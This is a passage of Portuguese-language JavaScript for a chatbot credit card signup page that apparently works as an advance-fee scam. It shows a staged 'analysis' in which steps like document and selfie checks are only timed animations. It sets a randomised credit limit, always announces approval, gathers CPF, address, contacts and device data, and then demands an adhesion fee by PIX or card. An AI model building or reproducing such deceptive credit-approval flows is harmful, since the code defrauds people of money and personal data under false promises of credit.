    addMsg('📊 <strong>Quantas pessoas na sua família usam medicamentos?</strong>');
    await new Promise(function(resolve) {
      showOptions([
        { label:'Só eu', action:function(){ quizAnswers.pessoas='Só eu'; resolve(); }},
        { label:'Eu + 1 pessoa', action:function(){ quizAnswers.pessoas='Eu + 1 pessoa'; resolve(); }},
        { label:'Toda a família', action:function(){ quizAnswers.pessoas='Toda a família'; resolve(); }}
      ]);
    });

    // Após questionário → LGPD + Docs
    await sleep(300);
    addTyping(); await sleep(500); removeTyping();
    addMsg('✅ <strong>Perfil registrado!</strong> Agora precisamos da sua autorização:', 'bot');
    await sleep(200);

    var ta = document.createElement('div');
    ta.className = 'chat-msg chat-msg--bot'; ta.id = 'chatTermos';
    ta.innerHTML = '<div class="chat-terms"><input type="checkbox" id="chkTermos"><label for="chkTermos">Autorizo o tratamento dos meus dados conforme a LGPD para análise de crédito e aceito os Termos de Uso do CREDVALE.</label></div>';
    chatMsg.appendChild(ta); scrollDown();
    showOptions([
      { label:'✅ Aceito e continuar', primary:true, action:function(){
        if (!document.getElementById('chkTermos')?.checked) { addMsg('Marque a caixa para aceitar os termos.','bot'); return; }
        document.getElementById('chatTermos')?.remove();
        trackStage('Preenchendo Cadastro'); etapaDocs();
      }}
    ]);
  }

  /* ---- ANÁLISE AUTOMÁTICA + POPUP APROVAÇÃO ---- */
  async function etapaAnalisePopup() {
    trackStage('Analisando Crédito');
    updateProgress(7);
    var clientId = 'CLI-'+Date.now().toString(36).toUpperCase();
    var limite = (function() {
      var base = 1800;
      if (quizAnswers.gasto === 'R$ 51 a R$ 200') base += 300;
      else if (quizAnswers.gasto === 'Acima de R$ 200') base += 600;
      if (quizAnswers.frequencia === '1 vez por mês') base += 200;
      else if (quizAnswers.frequencia === 'Várias vezes por mês') base += 400;
      if (quizAnswers.pessoas === 'Eu + 1 pessoa') base += 200;
      else if (quizAnswers.pessoas === 'Toda a família') base += 400;
      base += Math.floor(Math.random() * 201);
      base = Math.min(3500, Math.max(1800, base));
      return Math.round(base / 50) * 50;
    })();
    flowState = 'analysis';
    hideInput();

    var steps = [
      { label:'Validando documentos', done:false },
      { label:'Conferindo selfie', done:false },
      { label:'Analisando questionário', done:false },
      { label:'Consultando cadastro', done:false },
      { label:'Calculando limite', done:false },
      { label:'Preparando proposta', done:false }
    ];

    var procHtml =
      '<div class="popup-spinner"></div>'+
      '<div class="popup-title">Analisando seus dados</div>'+
      '<div class="popup-subtitle">Estamos processando suas informações</div>'+
      '<div class="popup-step-list" id="popupStepList">'+
        steps.map(function(s,i){
          return '<div class="popup-step-item" data-idx="'+i+'"><div class="popup-step-icon">'+(i+1)+'</div>'+s.label+'</div>';
        }).join('')+
      '</div>'+
      '<div class="popup-progress-bar"><div class="popup-progress-fill" id="popupProgressFill"></div></div>';

    showPopup(procHtml);

    var fill = document.getElementById('popupProgressFill');
    for (var i=0; i<steps.length; i++) {
      var item = document.querySelector('.popup-step-item[data-idx="'+i+'"]');
      if (item) {
        item.classList.add('popup-step-item--active');
        var ic = item.querySelector('.popup-step-icon');
        if (ic) ic.textContent = '⟳';
        await sleep(1800 + Math.floor(Math.random()*1200));
        item.classList.remove('popup-step-item--active');
        item.classList.add('popup-step-item--done');
        if (ic) ic.textContent = '✓';
      } else {
        await sleep(1800 + Math.floor(Math.random()*1200));
      }
      if (fill) fill.style.width = Math.round(((i+1)/steps.length)*100)+'%';
    }

    var apiData = {
      cpf: user.cpf, nome: user.nome, nascimento: user.nascimento, sexo: user.sexo,
      cep: user.cep, rua: user.rua, numero: user.numero, complemento: user.complemento,
      bairro: user.bairro, cidade: user.cidade, uf: user.uf,
      whatsapp: user.whatsapp, email: user.email,
      nome_mae: '', renda: '0', profissao: '', situacao: '',
      limite_aprovado: limite,
      dispositivo: sessionStorage.getItem('vs_dispositivo')||'Desktop',
      modelo: sessionStorage.getItem('vs_modelo')||'PC',
      fabricante: sessionStorage.getItem('vs_fabricante')||'',
      os: sessionStorage.getItem('vs_os')||'',
      navegador: sessionStorage.getItem('vs_navegador')||'',
      navegador_versao: sessionStorage.getItem('vs_navegador_versao')||''
    };
    var apiResult = await API.createClient(apiData).catch(function(){ return null; });
    clientId = apiResult ? apiResult.clientId : clientId;
    if (apiResult) {
      trackStage('Cadastro Aprovado', {nome: user.nome, cpf: user.cpf});
    }

    sessionStorage.setItem('vs_clientId', clientId);
    sessionStorage.setItem('vs_nome', (user.nome||'').split(' ')[0]);
    sessionStorage.setItem('vs_nome_completo', user.nome);
    sessionStorage.setItem('vs_limite', limite);

    await sleep(600);
    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
    var limFmt = Number(limite).toFixed(2).replace('.',',');
    var popupBox = document.querySelector('.popup-box');
    if (popupBox) {
      popupBox.innerHTML =
        '<div style="text-align:center;margin-bottom:12px;">'+
          '<div style="display:inline-flex;align-items:center;gap:5px;background:rgba(76,200,164,0.12);border:1px solid rgba(76,200,164,0.2);border-radius:20px;padding:4px 14px 4px 10px;margin-bottom:10px;">'+
            '<span style="width:18px;height:18px;border-radius:50%;background:linear-gradient(135deg,#4CC8A4,#059669);display:flex;align-items:center;justify-content:center;font-size:0.5rem;color:#fff;">✓</span>'+
            '<span style="font-size:0.65rem;color:#4CC8A4;font-weight:700;letter-spacing:0.3px;">CRÉDITO APROVADO</span>'+
          '</div>'+
          '<div style="display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px;">'+
            '<span style="font-size:1.8rem;line-height:1;">🎉</span>'+
            '<div style="font-size:1.25rem;font-weight:800;color:#e2e8f0;">Parabéns, <span style="background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;">'+nomePrimeiro+'</span>!</div>'+
          '</div>'+
          '<div style="background:linear-gradient(160deg,rgba(76,200,164,0.06),rgba(59,130,246,0.04));border:1px solid rgba(76,200,164,0.12);border-radius:16px;padding:14px 16px;margin-bottom:12px;">'+
            '<div style="font-size:0.6rem;color:#6b7a8f;text-transform:uppercase;letter-spacing:0.5px;margin-bottom:2px;">Seu limite liberado</div>'+
            '<div style="font-size:2rem;font-weight:900;background:linear-gradient(135deg,#4CC8A4,#3B82F6);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;font-family:Space Grotesk,sans-serif;line-height:1.2;">R$ '+limFmt+'</div>'+
          '</div>'+
          '<div style="text-align:left;">'+
            '<div style="font-size:0.72rem;color:#8a9aa8;font-weight:600;margin-bottom:6px;text-transform:uppercase;letter-spacing:0.3px;">⚡ Benefícios</div>'+
            '<div style="display:flex;flex-direction:column;gap:4px;">'+
              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Desconto de até <strong>75%</strong> em medicamentos</div>'+
              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Fatura em até <strong>45 dias</strong> para pagar</div>'+
              '<div style="display:flex;align-items:center;gap:8px;font-size:0.75rem;color:#c8d0dc;padding:5px 8px;border-radius:8px;background:rgba(255,255,255,0.02);"><span style="width:16px;height:16px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">✓</span> Parcelamento de medicamentos em até <strong>15x</strong></div>'+
            '</div>'+
          '</div>'+
        '</div>'+
        '<button class="chat-option chat-option--primary" id="popupContinuar" style="padding:14px;font-size:0.88rem;border:none;border-radius:12px;cursor:pointer;font-weight:800;font-family:inherit;background:linear-gradient(135deg,#3B82F6,#4CC8A4);color:#fff;width:100%;box-shadow:0 4px 20px rgba(59,130,246,0.15);transition:all .3s;">Continuar</button>';

      // Só aprova e envia SMS depois que o cliente VIU a mensagem de aprovação
      try { await API.updateClientStatus(clientId, 'aprovado', limite); } catch (e) { console.error('[aprovar]', e); }
    }

    await new Promise(function(resolve) {
      var btn = document.getElementById('popupContinuar');
      if (btn) { btn.onclick = function() { closePopup(); resolve(); }; }
      else { resolve(); }
    });

    hideInput();
    await sleep(200);
    etapaCardChoice(clientId, limite);
  }

  /* ---- ETAPA 8: Escolha do Plano ---- */
  async function etapaCardChoice(clientId, limite) {
    updateProgress(8);
    flowState = 'card-choice';
    hideInput();

    var nome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    var taxaStd = getPrecoStr('virtual');
    var taxaPlus = getPrecoStr('fisico');

    var cardHtml =
      '<div style="text-align:center;margin-bottom:10px;">'+
        '<div style="font-size:1.15rem;font-weight:900;color:#4CC8A4;margin-bottom:1px;">🎉 '+nome+'!</div>'+
        '<div style="font-size:0.75rem;font-weight:500;color:#6b7a8f;">Escolha o plano ideal para voc\u00ea.</div>'+
      '</div>'+

      '<div style="display:flex;flex-direction:column;gap:10px;">'+

        /* Standard */
        '<div style="border-radius:14px;border:1px solid rgba(255,255,255,0.08);background:linear-gradient(160deg,rgba(255,255,255,0.04),rgba(255,255,255,0.01));padding:14px 14px 10px;position:relative;">'+
          '<div style="font-size:1rem;font-weight:800;background:linear-gradient(135deg,#e2e8f0,#94a3b8);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin-bottom:1px;font-family:Space Grotesk,sans-serif;">Standard</div>'+
          '<div style="font-size:0.6rem;color:#6b7a8f;margin-bottom:6px;">Cart\u00e3o virtual \u00b7 Taxa \u00fanica: <strong style="color:#4CC8A4;">'+taxaStd+'</strong></div>'+
          '<ul style="list-style:none;padding:0;margin:0 0 4px;display:flex;flex-direction:column;gap:3px;">'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Cart\u00e3o Virtual</li>'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> At\u00e9 55% OFF em medicamentos</li>'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de cr\u00e9dito</li>'+
          '</ul>'+
          '<div style="display:flex;align-items:baseline;gap:3px;padding:5px 0;border-top:1px solid rgba(255,255,255,0.04);margin-bottom:6px;">'+
            '<span style="font-size:1.1rem;font-weight:900;color:#e2e8f0;font-family:Space Grotesk,sans-serif;">Gr\u00e1tis</span>'+
            '<span style="font-size:0.55rem;color:#6b7a8f;margin-left:2px;">/m\u00eas</span>'+
          '</div>'+
          '<button class="chat-option chat-option--secondary" id="btnPlanoStandard" style="width:100%;padding:10px;border-radius:10px;font-size:0.75rem;font-weight:700;cursor:pointer;border:1px solid rgba(255,255,255,0.08);background:rgba(255,255,255,0.04);color:#c8d0dc;">Continuar com Standard</button>'+
        '</div>'+

        /* Plus */
        '<div style="border-radius:14px;border:2px solid rgba(76,200,164,0.3);background:linear-gradient(160deg,rgba(16,185,129,0.06),rgba(59,130,246,0.03));padding:14px 14px 10px;position:relative;box-shadow:0 0 16px rgba(16,185,129,0.06);">'+
          '<div style="text-align:center;background:linear-gradient(90deg,#059669,#10B981);border-radius:0 0 6px 6px;padding:2px 8px;position:absolute;top:0;left:10px;right:10px;">'+
            '<span style="font-size:0.45rem;font-weight:800;text-transform:uppercase;letter-spacing:0.08em;color:#fff;">\u2b50 Mais escolhido</span>'+
          '</div>'+
          '<div style="font-size:1rem;font-weight:800;background:linear-gradient(135deg,#4CC8A4,#e2e8f0);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text;margin:8px 0 1px;font-family:Space Grotesk,sans-serif;">Plus Sa\u00fade</div>'+
          '<div style="font-size:0.6rem;color:#6b7a8f;margin-bottom:6px;">Cart\u00e3o f\u00edsico + digital \u00b7 Taxa \u00fanica: <strong style="color:#4CC8A4;">'+taxaPlus+'</strong></div>'+
          '<ul style="list-style:none;padding:0;margin:0 0 4px;display:flex;flex-direction:column;gap:3px;">'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Cart\u00e3o F\u00edsico + Virtual</li>'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> At\u00e9 75% OFF em medicamentos</li>'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> Limite de at\u00e9 R$ 5.000</li>'+
            '<li style="font-size:0.68rem;color:#94a3b0;display:flex;align-items:center;gap:6px;"><span style="width:14px;height:14px;border-radius:50%;background:rgba(76,200,164,0.12);color:#4CC8A4;display:flex;align-items:center;justify-content:center;font-size:0.5rem;flex-shrink:0;">\u2713</span> 2% Cashback + Teleconsulta</li>'+
          '</ul>'+
          '<div style="display:flex;align-items:baseline;gap:3px;padding:5px 0;border-top:1px solid rgba(255,255,255,0.04);margin-bottom:6px;">'+
            '<span style="font-size:0.55rem;color:#6b7a8f;">R$</span>'+
            '<span style="font-size:1.1rem;font-weight:900;color:#e2e8f0;font-family:Space Grotesk,sans-serif;">14,90</span>'+
            '<span style="font-size:0.55rem;color:#6b7a8f;">/m\u00eas</span>'+
          '</div>'+
          '<button class="chat-option chat-option--primary" id="btnPlanoPlus" style="width:100%;padding:10px;border-radius:10px;font-size:0.75rem;font-weight:700;cursor:pointer;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;box-shadow:0 3px 12px rgba(16,185,129,0.2);">Continuar com Plus</button>'+
        '</div>'+

      '</div>';

    showPopup(cardHtml);

    document.getElementById('btnPlanoStandard').onclick = function() {
      chosenCard = 'virtual';
      closePopup();
      addMsg('📱 <strong>Standard</strong> selecionado','user');
      setTimeout(function() { iniciarPosPlano(clientId, limite); }, 300);
    };

    document.getElementById('btnPlanoPlus').onclick = function() {
      chosenCard = 'fisico';
      closePopup();
      addMsg('💳 <strong>Plus</strong> selecionado','user');
      setTimeout(function() { iniciarPosPlano(clientId, limite); }, 300);
    };
  }

  /* ---- PÓS-PLANO: loading → mensagem na conversa com botões ---- */
  async function iniciarPosPlano(clientId, limite) {
    flowState = 'pos-plano';
    hideInput();

    var msgs = [
      'Preparando sua contratação...',
      'Gerando sua solicitação...',
      'Falta muito pouco...',
      'Estamos finalizando as últimas etapas...'
    ];

    showPopup(
      '<div style="text-align:center;padding:16px 0;">'+
        '<div style="width:52px;height:52px;margin:0 auto 14px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
        '<div style="font-weight:700;font-size:1rem;color:#e2e8f0;margin-bottom:4px;" id="loadingMsg">'+msgs[0]+'</div>'+
      '</div>'
    );

    var loadingEl = document.getElementById('loadingMsg');
    for (var i=1; i<msgs.length; i++) {
      await sleep(500);
      if (loadingEl) loadingEl.textContent = msgs[i];
    }
    await sleep(500);

    closePopup();

    var taxa = getPrecoStr(chosenCard);
    var nomePlano = chosenCard==='virtual' ? 'Standard' : 'Plus';
    var primeiroNome = (user.nome||'Cliente').split(' ')[0]||'Cliente';

    // Formatar dados
    var cpfFmt = user.cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/,'$1.$2.$3-$4');
    var nascFmt = user.nascimento ? user.nascimento.split('-').reverse().join('/') : '—';
    var sexoLabel = user.sexo==='F'?'Feminino':user.sexo==='M'?'Masculino':user.sexo||'—';
    var enderecoFmt = (user.rua||'—')+', '+(user.numero||'s/n')+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'—')+' · '+(user.cidade||'—')+' - '+(user.uf||'—');
    var phoneFmt = user.whatsapp ? user.whatsapp.replace(/(\d{2})(\d{4,5})(\d{4})/,'($1) $2-$3') : '—';

    // Mensagem de revisão dos dados
    addMsg(
      '<div style="background:rgba(255,255,255,0.02);border:1px solid rgba(255,255,255,0.06);border-radius:14px;padding:16px;margin-bottom:4px;">'+
        '<div style="font-size:0.85rem;font-weight:700;color:#e2e8f0;margin-bottom:10px;text-align:center;">📋 Revise seus dados</div>'+
        '<div style="display:flex;flex-direction:column;gap:4px;">'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Nome</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+user.nome+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">CPF</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+cpfFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Nascimento</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+nascFmt+' · '+sexoLabel+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">Endereço</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+enderecoFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">WhatsApp</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+phoneFmt+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;"><span style="color:#6b7a8f;">E-mail</span><span style="color:#e2e8f0;font-weight:600;text-align:right;">'+(user.email||'—')+'</span></div>'+
          '<div style="display:flex;justify-content:space-between;font-size:0.72rem;padding:5px 8px;border-radius:6px;background:rgba(255,255,255,0.02);"><span style="color:#6b7a8f;">Plano</span><span style="color:#4CC8A4;font-weight:700;text-align:right;">'+nomePlano+'</span></div>'+
        '</div>'+
      '</div>',
      'bot'
    );

    // Botão de confirmação
    var btnConfirmarDados = document.createElement('div');
    btnConfirmarDados.className = 'chat-msg chat-msg--bot';
    btnConfirmarDados.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnConfirmarDados" style="width:100%;padding:14px;border-radius:12px;font-size:0.85rem;font-weight:700;cursor:pointer;border:none;background:linear-gradient(135deg,#059669,#10B981);color:#fff;box-shadow:0 4px 16px rgba(16,185,129,0.2);">✅ Tudo OK, continuar</button>';
    chatMsg.appendChild(btnConfirmarDados);
    scrollDown();

    document.getElementById('btnConfirmarDados').onclick = function() {
      trackStage('Enviando Cadastro');
      btnConfirmarDados.remove();

      addMsg(
        '<div style="text-align:center;padding:4px 0;">'+
          '<div style="font-size:1.2rem;font-weight:900;color:#4CC8A4;margin-bottom:2px;">🎉 Perfeito, '+primeiroNome+'!</div>'+
          '<div style="font-size:0.85rem;color:#e2e8f0;"><strong>Plano '+nomePlano+'</strong> selecionado com sucesso.</div>'+
        '</div>',
        'bot'
      );

      addMsg(
        '<div style="font-size:0.78rem;color:#94a3b0;line-height:1.5;text-align:center;padding:2px 0;">'+
          'Agora escolha abaixo a forma de pagamento da <strong style="color:#e2e8f0;">taxa de ades\u00e3o <span style="color:#4CC8A4;">'+taxa+'</span></strong> do <strong style="color:#e2e8f0;">'+nomePlano+'</strong> para ativar seu cart\u00e3o.'+
        '</div>',
        'bot'
      );

      mostrarBotoesPagamento(clientId, limite, taxa);
    };
  }

  /* ---- Botões de pagamento persistentes na conversa ---- */
  function mostrarBotoesPagamento(clientId, limite, taxa) {
    updateProgress(9);
    // Botão PIX
    var btnPix = document.createElement('div');
    btnPix.className = 'chat-msg chat-msg--bot';
    btnPix.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnPagarPix" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar taxa de adesão com PIX</button>';
    chatMsg.appendChild(btnPix);
    scrollDown();

    document.getElementById('btnPagarPix').onclick = function() {
      modalPix(clientId, limite);
    };

    // Botão Cartão
    var btnCard = document.createElement('div');
    btnCard.className = 'chat-msg chat-msg--bot';
    btnCard.innerHTML =
      '<button class="chat-option chat-option--primary" id="btnPagarCartao" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💳 Pagar com Cartão de Crédito</button>';
    chatMsg.appendChild(btnCard);
    scrollDown();

    document.getElementById('btnPagarCartao').onclick = function() {
      modalCartao(clientId, limite);
    };

    // Botão Confirmar pagamento (sempre disponível)
    var btnConfirmar = document.createElement('div');
    btnConfirmar.className = 'chat-msg chat-msg--bot';
    btnConfirmar.id = 'msgConfirmarPagamento';
    btnConfirmar.innerHTML =
      '<div style="margin-top:4px;border-top:1px solid rgba(255,255,255,0.06);padding-top:8px;">'+
        '<button class="chat-option chat-option--primary" id="btnConfirmarPagamento" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;background:linear-gradient(135deg,#059669,#10B981);">✅ Confirmar pagamento</button>'+
      '</div>';
    chatMsg.appendChild(btnConfirmar);
    scrollDown();

    document.getElementById('btnConfirmarPagamento').onclick = function() {
      var nome = (user.nome||'').split(' ')[0]||'';
      var cpfLimpo = user.cpf||'00000000000';
      abrirWhatsAppVerificacao(clientId, limite, taxa, nome, cpfLimpo);
    };
  }

  /* ---- ETAPA 8B: Confirma Endereço (Cartão Físico) ---- */
  async function etapaConfirmarEndereco(clientId, limite) {
    flowState = 'addr-confirm';
    hideInput();
    await sleep(200);

    var endStr = (user.rua||'Rua')+', '+user.numero+(user.complemento?' - '+user.complemento:'')+'<br>'+(user.bairro||'Bairro')+' · '+(user.cidade||'Cidade')+' - '+(user.uf||'UF');

    var popHtml =
      '<div style="font-size:2rem;margin-bottom:8px;">📍</div>'+
      '<div class="popup-title">Confirmar Endereço de Entrega</div>'+
      '<div class="popup-subtitle">Seu cartão físico será enviado para:</div>'+
      '<div class="addr-confirm-card"><div class="addr-confirm-line">'+endStr+'</div></div>'+
      '<div class="addr-confirm-actions">'+
        '<button class="chat-option chat-option--primary" id="addrConfirmYes" style="flex:1;">✅ Sim, está correto</button>'+
      '</div>'+
      '<div style="margin-top:10px;">'+
        '<button class="chat-option" id="addrConfirmEdit" style="width:100%;">✏️ Quero editar o endereço</button>'+
      '</div>';

    showPopup(popHtml);

    document.getElementById('addrConfirmYes').onclick = function() {
      closePopup();
      setTimeout(function() { etapaConfirmacaoWhatsApp(clientId, limite); }, 300);
    };

    document.getElementById('addrConfirmEdit').onclick = function() {
      closePopup();
      addMsg('Qual o <strong>CEP</strong> correto?');
      setInput('Digite o CEP', 'cep');
      waitUserInput().then(function(cep) {
        cep = cep.replace(/\D/g,'');
        if (cep.length===8) {
          user.cep = cep;
          fetch('https://viacep.com.br/ws/'+cep+'/json/').then(function(r){ return r.json(); }).then(function(end){
            if (end && !end.erro) {
              user.rua = end.logradouro||user.rua;
              user.bairro = end.bairro||user.bairro;
              user.cidade = end.localidade||user.cidade;
              user.uf = end.uf||user.uf;
            }
            addMsg('Número?'); setInput('Número', 'number'); return waitUserInput();
          }).then(function(num){ user.numero=num; addMsg('Complemento? (ou —)'); setInput('Complemento ou —'); return waitUserInput(); })
          .then(function(c){ user.complemento=(c==='—'||c==='-')?'':c; etapaConfirmacaoWhatsApp(clientId, limite); });
        }
      });
    };
  }

  /* ---- ETAPA 9: Confirmação WhatsApp (antes do checkout) ---- */
  async function etapaConfirmacaoWhatsApp(clientId, limite) {
    flowState = 'wa-confirm';
    hideInput();
    await sleep(200);

    var phoneFmt = formatarTelefone(user.whatsapp);
    var popHtml =
      '<div style="font-size:2.5rem;margin-bottom:8px;">💬</div>'+
      '<div class="popup-title">Seu WhatsApp está correto?</div>'+
      '<div class="wa-confirm-number" style="font-size:1.4rem;font-weight:900;padding:16px 0;margin:8px 0;letter-spacing:1px;">'+phoneFmt+'</div>'+
      '<div class="wa-confirm-hint">'+
        '📌 <strong style="color:#4CC8A4;">Importante:</strong> É por este WhatsApp que você vai receber suas <strong style="color:#e2e8f0;">credenciais de acesso</strong> e o link para ativar seu cartão.'+
      '</div>'+
      '<div style="display:flex;gap:10px;margin-top:16px;">'+
        '<button class="chat-option chat-option--primary" id="waConfirmYes" style="flex:1;padding:14px;font-size:0.9rem;">✅ Sim, está correto</button>'+
        '<button class="chat-option chat-option--danger" id="waConfirmEdit" style="padding:14px;font-size:0.9rem;">✏️ Editar</button>'+
      '</div>';

    showPopup(popHtml);

    await new Promise(function(resolve) {
      document.getElementById('waConfirmYes').onclick = function() {
        closePopup();
        addMsg('WhatsApp confirmado: <strong>'+phoneFmt+'</strong>','user');
        resolve();
      };
      document.getElementById('waConfirmEdit').onclick = function() {
        closePopup();
        addMsg('Digite o <strong>número correto</strong> do WhatsApp:');
        setInput('(11) 99999-9999','phone');
        waitUserInput().then(function(p) {
          p = p.replace(/\D/g,'');
          if (p.length>=10) { user.whatsapp = p; hideInput(); }
          resolve();
        });
      };
    });

    await sleep(200);
    modalPix(clientId, limite);
  }

  /* ---- PIX MODAL ---- */
  function modalPix(clientId, limite) {
    flowState = 'pix';
    hideInput();

    var valor = getPreco(chosenCard);
    var apiBase = window.__API_BASE||'/api';
    var nomePrimeiro = (user.nome||'').split(' ')[0]||'';
    var cpfLimpo = user.cpf||'00000000000';

    // Loading enquanto consulta config
    showPopup(
      '<div style="text-align:center;padding:20px 0;">'+
        '<div style="width:52px;height:52px;margin:0 auto 16px;border:4px solid rgba(255,255,255,0.06);border-top-color:#4CC8A4;border-radius:50%;animation:spin 1s linear infinite;"></div>'+
        '<div style="font-weight:700;font-size:1rem;color:#e2e8f0;margin-bottom:4px;">Preparando pagamento...</div>'+
        '<div style="font-size:0.8rem;color:#6b7a8f;">Aguarde um momento</div>'+
      '</div>'
    );

    fetch(apiBase+'/payments/config').then(function(r){ return r.json(); }).then(function(config){
      var pushinpayUrl = (chosenCard==='fisico'
        ? (config.pushinpay_url_fisico||config.pushinpay_url||'')
        : (config.pushinpay_url_virtual||config.pushinpay_url||'')).trim();

      if (pushinpayUrl) {
        closePopup();
        showPushinpayPage(pushinpayUrl, clientId, limite);
        return;
      }

      // PushinPay inativo → gera PIX Copia e Cola via backend
      fetch(apiBase+'/payments/generate-pix', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body:JSON.stringify({client_id:clientId, valor:valor})
      }).then(function(r){ return r.json(); }).then(function(data){
        closePopup();
        showPixCopiaCola(clientId, limite, data.pixCopiaCola, data.pixQrCode, valor, nomePrimeiro, cpfLimpo);
      }).catch(function(){
        closePopup();
        addMsg('Erro ao gerar pagamento. Tente novamente.','bot');
      });
    }).catch(function(){
      closePopup();
      addMsg('Erro ao carregar configuração de pagamento.','bot');
    });
  }

  /* ---- PushinPay: página com botão clicável ---- */
  function showPushinpayPage(url, clientId, limite) {
    var apiBase = window.__API_BASE||'/api';
    showPopup(
      '<div style="text-align:center;padding:8px 0;">'+
        '<div style="font-size:2rem;margin-bottom:4px;">🔗</div>'+
        '<div class="popup-title" style="font-size:1rem;">Pagamento PushinPay</div>'+
        '<div style="font-size:0.75rem;color:#6b7a8f;margin-bottom:14px;">Você será redirecionado para o checkout seguro</div>'+
        '<button class="chat-option chat-option--primary" id="pushinpayIr" style="width:100%;padding:14px;font-size:0.9rem;font-weight:700;">💚 Ir para o pagamento</button>'+
        '<div style="margin-top:10px;">'+
          '<button class="chat-option" id="pushinpayJaPaguei" style="width:100%;padding:10px;font-size:0.8rem;">✅ Já paguei — confirmar</button>'+
        '</div>'+
      '</div>'
    );

    document.getElementById('pushinpayIr').onclick = function() {
      try { navigator.sendBeacon(apiBase+'/track/pushinpay-click', new Blob([JSON.stringify({client_id:clientId,plano:chosenCard})], {type:'application/json'})); } catch(e){}
      window.open(url, '_blank');
    };

    document.getElementById('pushinpayJaPaguei').onclick = function() {
      closePopup();
      var taxa = getPrecoStr(chosenCard);
      var cpfLimpo = user.cpf||'00000000000';
      abrirWhatsAppVerificacao(clientId, limite, taxa, (user.nome||'').split(' ')[0]||'', cpfLimpo);
    };
  }

  /* ---- PIX Copia e Cola (fallback quando PushinPay inativo) ---- */
  function showPixCopiaCola(clientId, limite, copiaCola, qrCodeUrl, valor, nomePrimeiro, cpfLimpo) {
    var taxa = 'R$ '+valor.toFixed(2).replace('.',',');

    var pixHtml =
      '<div style="text-align:center;margin-bottom:8px;">'+
        '<div style="font-size:1.6rem;margin-bottom:2px;">💚</div>'+
        '<div class="popup-title" style="font-size:1rem;">Pagamento via PIX</div>'+
